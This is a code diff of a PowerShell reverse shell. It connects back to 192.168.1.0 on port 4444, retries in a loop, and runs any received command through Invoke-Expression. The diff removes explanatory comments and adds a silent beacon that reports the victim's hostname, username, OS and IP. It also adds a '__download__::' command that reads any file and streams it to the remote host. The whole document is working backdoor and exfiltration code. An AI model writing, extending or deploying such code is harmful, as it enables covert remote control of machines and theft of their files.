@@ -1,6 +1,5 @@
 do {
     try {
-        # Attempt to connect to the listener
         $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
         if ($client.Connected) {
             $stream = $client.GetStream()
@@ -8,47 +7,53 @@ do {
             $writer.AutoFlush = $true
             $reader = New-Object System.IO.StreamReader($stream)
 
-            # Notify the server about the successful connection
-            $writer.WriteLine("Reverse shell connection established.")
-            
-            # Process commands from the server
+            # SYSTEM INFO (no output to user)
+            $sysinfo = @{
+                Hostname = $env:COMPUTERNAME
+                Username = $env:USERNAME
+                OS = (Get-CimInstance Win32_OperatingSystem).Caption
+                IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' } | Select -First 1 -ExpandProperty IPAddress)
+            } | ConvertTo-Json -Compress
+            $writer.WriteLine("CONNECTED: $sysinfo")
+
             while ($true) {
-                try {
-                    # Wait for a command from the server
-                    $command = $reader.ReadLine()
-                    if ($command -eq $null) {
-                        break # Exit the loop if the connection is closed
+                $command = $reader.ReadLine()
+                if ($command -like "__download__::*") {
+                    $filePath = $command -replace "__download__::", ""
+                    if (Test-Path $filePath) {
+                        $writer.WriteLine("__begin_file__")
+                        $stream.Flush()
+                        $bytes = [System.IO.File]::ReadAllBytes($filePath)
+                        $stream.Write($bytes, 0, $bytes.Length)
+                        $stream.Flush()
+                        $end_marker = [System.Text.Encoding]::UTF8.GetBytes("__end_file__")
+                        $stream.Write($end_marker, 0, $end_marker.Length)
+                        $stream.Flush()
+                    } else {
+                        $writer.WriteLine("__error__::File not found: $filePath")
+                        $stream.Flush()
                     }
-
-                    if ($command.Trim().ToLower() -eq "exit") {
-                        $writer.WriteLine("Target script terminated.")
-                        $client.Close()
-                        exit # Completely terminate the script
-                    }
-
-                    # Execute the command and capture output
-                    $output = try {
-                        Invoke-Expression $command | Out-String
-                    } catch {
-                        "Error executing command: $_"
-                    }
-
-                    # Send the command's output back to the server
-                    $writer.WriteLine($output)
-                } catch {
-                    # Handle any issues while processing commands
-                    break
+                    continue
                 }
-            }
+                if ($command -eq $null) { break }
+                if ($command.Trim().ToLower() -eq "exit") {
+                    $writer.WriteLine("Target script terminated.")
+                    $client.Close()
+                    exit
+                }
 
-            # Clean up after disconnection
+                $output = try {
+                    Invoke-Expression $command | Out-String
+                } catch {
+                    "Error executing command: $_"
+                }
+
+                $writer.WriteLine($output)
+            }
             $client.Close()
         }
     } catch {
-        # Handle connection attempt errors
         Start-Sleep -Seconds 5
     }
-
-    # Reattempt connection after a delay
     Start-Sleep -Seconds 5
 } while ($true)
